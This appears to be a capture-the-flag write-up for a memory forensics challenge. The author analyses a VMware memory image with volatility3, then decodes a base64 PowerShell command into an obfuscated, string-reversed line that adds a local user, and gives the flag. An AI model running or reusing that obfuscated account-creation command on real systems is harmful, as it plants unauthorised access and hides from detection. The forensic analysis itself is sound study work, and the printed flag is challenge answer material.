![image](https://github.com/user-attachments/assets/96a3873c-7886-4df0-9ab1-e639ff9ebfbf)

Download the file and extract it.

![image](https://github.com/user-attachments/assets/0b68dcc0-76d2-4ef7-a2b0-081afbd6ccfb)

![image](https://github.com/user-attachments/assets/e20b7a2c-7e46-48c1-99e1-6a8fb6983add)

We got 2 files here which is .vmem and .vmsn.

![image](https://github.com/user-attachments/assets/55c50539-3399-422d-8701-f85cd52546ac)

Upon checking with chatgpt, it looks like both of these files were for memory analysis

![image](https://github.com/user-attachments/assets/264eed52-9980-4ba6-b66a-4b423d1e46db)

![image](https://github.com/user-attachments/assets/6c72dd41-3d5d-41d5-8f9b-e760a5c1d57f)

So lets, copy and paste it into my WSL and use volatility3

![image](https://github.com/user-attachments/assets/a4343e73-8853-4c39-ae93-5a4e6e38abb9)

So now our objective is to find the created user. User could be created using cmd and powershell which is an executable, so based on my notes these are the commands that could be helpful for us.

![image](https://github.com/user-attachments/assets/4bf2b573-dbf1-4a19-b665-a72eab84d03a)

Lets try pslist first.

![image](https://github.com/user-attachments/assets/5dc51c1f-2cd4-4e47-bade-fb34822a4084)

![image](https://github.com/user-attachments/assets/49896d80-cbd3-4c7f-86ce-811fca5f3177)

Ok, there was indeed cmd and powershell's execution there. Lets use pstree now.

![image](https://github.com/user-attachments/assets/e500f8fe-b801-4e01-91d9-a6a0805137a9)

Yep! Looks like its base64 encoded. Lets decode it.

![image](https://github.com/user-attachments/assets/aa010481-0aeb-431c-b429-82f355f6c2cb)

Ok, so far so good. Looks like its still being encode but at least we got a readable now. `$laIIMq = 'dd' + 'a/' + ' ni' + 'mdAS' + 'YS n' + 'i' + 'md' + 'asys ' + 'r' + 'es' + 'u t' + 'en'; $kSmmAiw = -join ($laIIMq.ToCharArray()[-1..-($laIIMq.Length)]); Invoke-Expression $kSmmAiw ; Start-Sleep -Seconds 600` this looks like it was assigning a value to a variable. Powershell could be used in this case to act as programming language like c++ based on my experience. Lets try.

![image](https://github.com/user-attachments/assets/76934c39-ed12-4427-b871-5876fccc5769)

Ok, now we got the full command. Lets ask chatgpt to analyse it what does the command do.

![image](https://github.com/user-attachments/assets/26eeb3c0-3276-40d3-a957-0878fd798d6f)

We instantly got our answer for our flag which is `ihack{created user_created password}` and this case our flag is `ihack{sysadmin_SYSAdmin}`








